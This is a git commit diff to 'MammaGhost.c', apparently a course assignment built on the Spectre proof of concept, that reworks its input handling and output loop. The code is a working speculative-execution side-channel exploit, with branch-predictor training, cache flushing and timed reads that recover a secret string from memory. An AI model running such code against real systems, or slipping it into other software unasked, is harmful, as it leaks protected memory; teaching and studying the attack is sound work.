c32e0b170bde5e84d92701147eff7edf1fdf539c
Jacob Urick <jacoburick01@gmail.com>
2023-04-28 19:17:37 -0400

    Final version

--- MammaGhost.c
+++ MammaGhost.c
@@ -38,7 +38,7 @@ char * secret = "The Magic Words are Sqeamish Ossifraggee";
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
 void victim_function(size_t x, size_t y) {
-  if (((x  + y < array1_size) & ~y)) {
+  if (((x  + y < array1_size) & y)) {
     temp &= array2[array1[x + y] * 512];
   }
 }
@@ -63,7 +63,6 @@ void read_numbers_from_file(const char *filename, size_t x[], int num_lines) {
         line_counter++;
 
         if (sscanf(line, "%lu", &num) == 1) {
-            printf("%lu\n", num);
             x[line_counter - 1] = num; 
         } else {
             printf("Failed to parse line number %d: %s", line_counter, line);
@@ -95,14 +94,12 @@ void readMemoryByte(size_t inputs[12], uint8_t value[2], int score[2]) {
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
     for (j = 0; j < 12; j+=2) {
-        x = inputs[j % 6];
+        x = inputs[j];
       _mm_clflush( & array1_size);
       for (volatile int z = 0; z < 500; z++) {} /* Delay (can also mfence) */
-
       victim_function(inputs[j], inputs[j+1]);
 
     }
-
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < 256; i++) {
@@ -132,6 +129,7 @@ void readMemoryByte(size_t inputs[12], uint8_t value[2], int score[2]) {
     }
     if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
       break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+
   }
   results[0] ^= junk; /* use junk so code above won’t get optimized out*/
   value[0] = (uint8_t) j;
@@ -143,10 +141,10 @@ void readMemoryByte(size_t inputs[12], uint8_t value[2], int score[2]) {
 int main(int argc,
   const char * * argv) {
   size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
-  int i, score[2], len = 40;
+  int i, score[2], len;
   uint8_t value[2];
   size_t x[MAX_LINES];
-  size_t this_too[12];
+  size_t array_to_be_passed[12];
   size_t input_var;
 
   for(size_t idx = 0; idx < MAX_LINES; idx++){
@@ -155,7 +153,7 @@ int main(int argc,
   printf("Welcome to MammaGhost\n");
   printf("In these series of assignments, you will be exploring the Spectre Vulnerability\n");
   printf("Please give the name of a file containing 480 lines. Lines will be passed, two at a time, to the vulnerable function. \n");
-  printf("But first, here is your christmas present: %p\n%p\n", (void *)secret, (char * ) array1);
+  printf("But first, here is your christmas present: %lu, %lu\n", (size_t)(secret), (size_t)(char * ) array1);
     char filename[100];
     scanf("%s", filename);
 
@@ -163,20 +161,19 @@ int main(int argc,
    read_numbers_from_file(filename, x, MAX_LINES);
 
 
-  while(1);
   for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   i = 0;
-  while(len--){
-  size_t outr_idx = 40 - len - 1;
+  len = 40;
   printf("Reading %d bytes:\n", len);
-    for (int inner_idx = outr_idx*12; i < outr_idx + 12; i++) {
-        this_too[inner_idx - outr_idx] = x[i];
-    }
-    readMemoryByte(this_too, value, score);
-    printf("0x%02X=’%c’", value[0], value[0]);
-    printf("\n");
-    i += 2;
+  while(--len){
+    for(int arr_idx = 0; arr_idx < 12; arr_idx++){
+      array_to_be_passed[arr_idx] = x[i + arr_idx];
+    }    
+    readMemoryByte(array_to_be_passed, value, score);
+    printf("%c",  (value[0] > 31 && value[0] < 127 ? (char)value[0] : '?'));
+    i += 12;
   }
+   printf("\n");
   return (0);
 }
